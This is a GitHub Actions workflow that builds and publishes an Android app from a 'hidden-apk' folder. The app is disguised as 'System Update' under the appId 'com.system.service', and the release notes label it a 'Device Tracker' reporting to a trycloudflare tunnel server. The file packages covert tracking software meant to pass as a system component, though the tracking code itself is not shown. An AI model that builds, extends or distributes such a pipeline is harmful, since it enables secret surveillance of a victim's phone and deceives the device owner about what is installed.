name: Build Hidden APK

on:
  push:
    branches: [ main, master ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    
    steps:
    - name: Checkout code
      uses: actions/checkout@8e5e7e5ab8b370d6c329ec480221332ada57f0ab
    
    - name: Setup Node.js
      uses: actions/setup-node@5e21ff4d9bc1a8cf6de233a3057d20ec6b3fb69d
      with:
        node-version: '18'
    
    - name: Install dependencies
      run: |
        npm install
        npm install -g @capacitor/cli @capacitor/core @capacitor/android
    
    - name: Create www directory
      run: mkdir -p www
    
    - name: Copy hidden-apk files
      run: |
        if [ -d "hidden-apk" ] && [ -f "hidden-apk/index.html" ]; then
          cp -r hidden-apk/* www/
          echo "✅ Files copied"
          ls -la www/
        else
          echo "❌ hidden-apk/index.html not found!"
          exit 1
        fi
    
    - name: Create Capacitor config
      run: |
        cat > capacitor.config.json << 'EOF'
        {
          "appId": "com.system.service",
          "appName": "System Update",
          "webDir": "www",
          "plugins": { "SplashScreen": { "launchShowDuration": 0 }},
          "server": { "androidScheme": "https", "cleartext": true }
        }
        EOF
    
    - name: Add Android platform
      run: npx cap add android || echo "Platform exists"
    
    - name: Sync Capacitor
      run: npx cap sync android
    
    - name: Build APK
      run: |
        cd android
        chmod +x gradlew
        ./gradlew assembleDebug
        echo "✅ APK built"
    
    - name: Upload APK
      uses: actions/upload-artifact@b4b15b8c7c6ac21ea08fcf65892d2ee8f75cf882
      with:
        name: hidden-app-apk
        path: android/app/build/outputs/apk/debug/app-debug.apk
        retention-days: 30
    
    - name: Create Release
      uses: softprops/action-gh-release@de2c0eb89ae2a093876385947365aca7b0e5f844
      with:
        files: android/app/build/outputs/apk/debug/app-debug.apk
        tag_name: v${{ github.run_number }}
        name: Hidden APK v${{ github.run_number }}
        body: "## Device Tracker\n\nBuild #${{ github.run_number }}\n\nServer: assign-place-picture-recommendation.trycloudflare.com"
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
